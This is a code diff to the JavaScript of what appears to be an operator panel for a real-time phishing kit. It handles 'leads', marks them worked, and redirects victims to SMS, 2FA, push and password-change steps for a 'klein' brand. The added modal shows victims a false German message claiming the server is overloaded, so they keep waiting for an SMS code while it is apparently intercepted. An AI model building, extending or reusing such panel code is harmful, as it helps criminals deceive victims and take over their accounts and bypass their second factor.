@@ -1494,11 +1494,11 @@
     if (btnSmsDetail && btnSmsKleinDetail) {
       if (brand === 'klein') {
         btnSmsDetail.style.display = 'none';
-        btnSmsKleinDetail.style.display = '';
+        btnSmsKleinDetail.classList.remove('hidden');
         if (btn2faDetail) btn2faDetail.style.display = 'none';
       } else {
         btnSmsDetail.style.display = '';
-        btnSmsKleinDetail.style.display = 'none';
+        btnSmsKleinDetail.classList.add('hidden');
         if (btn2faDetail) btn2faDetail.style.display = '';
       }
     }
@@ -2190,6 +2190,8 @@
     var btnError = document.getElementById('btn-error');
     var btnSms = document.getElementById('btn-sms');
     var btnSmsKlein = document.getElementById('btn-sms-klein');
+    var btnSmsKleinAction = document.getElementById('btn-sms-klein-action');
+    var btnSmsKleinWait = document.getElementById('btn-sms-klein-wait');
     var btnPush = document.getElementById('btn-push');
     var btnChangePassword = document.getElementById('btn-change-password');
     var btnSuccess = document.getElementById('btn-success');
@@ -2249,7 +2251,9 @@
     if (btnWorked) btnWorked.addEventListener('click', function (e) { doAction('/api/mark-worked', e); });
     if (btnError) btnError.addEventListener('click', function (e) { doAction('/api/show-error', e); });
     if (btnSms) btnSms.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
-    if (btnSmsKlein) btnSmsKlein.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
+    if (btnSmsKleinAction) btnSmsKleinAction.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
+    // Backward compatibility: if old single button exists
+    if (btnSmsKlein && !btnSmsKleinAction && btnSmsKlein.addEventListener) btnSmsKlein.addEventListener('click', function (e) { doAction('/api/redirect-sms-code', e); });
     var btn2fa = document.getElementById('btn-2fa');
     if (btn2fa) btn2fa.addEventListener('click', function (e) { doAction('/api/redirect-2fa-code', e); });
     if (btnPush) btnPush.addEventListener('click', function (e) { doAction('/api/redirect-push', e); });
@@ -2320,6 +2324,40 @@
         loadStats(period);
       });
     }
+  }
+
+  function initKleinSmsWaitModal() {
+    var modal = document.getElementById('klein-sms-wait-modal');
+    var backdrop = document.getElementById('klein-sms-wait-modal-backdrop');
+    var closeBtn = document.getElementById('klein-sms-wait-modal-close');
+    var okBtn = document.getElementById('klein-sms-wait-modal-ok');
+    var body = document.getElementById('klein-sms-wait-modal-body');
+    var trigger = document.getElementById('btn-sms-klein-wait');
+
+    var text = 'Bitte warte ein paar Minuten auf den SMS-Code, der Server ist überlastet. Verlasse die Seite nicht, damit das Eingabefeld für die SMS nicht verschwindet.';
+
+    function close() {
+      if (!modal) return;
+      modal.classList.add('hidden');
+      modal.setAttribute('aria-hidden', 'true');
+    }
+    function open() {
+      if (!modal) return;
+      if (body) body.textContent = text;
+      modal.classList.remove('hidden');
+      modal.setAttribute('aria-hidden', 'false');
+    }
+
+    if (trigger) trigger.addEventListener('click', function (e) {
+      if (e && e.preventDefault) e.preventDefault();
+      open();
+    });
+    if (backdrop) backdrop.addEventListener('click', close);
+    if (closeBtn) closeBtn.addEventListener('click', close);
+    if (okBtn) okBtn.addEventListener('click', close);
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && modal && !modal.classList.contains('hidden')) close();
+    });
   }
 
   function initFingerprintModal() {
@@ -4598,6 +4636,7 @@
     initModeAndStartPage();
     initHeaderMailAndArchive();
     initButtons();
+    initKleinSmsWaitModal();
     initAdminChat();
     loadStats('today');
     loadLeads(null, null, { ensureSelected: true });
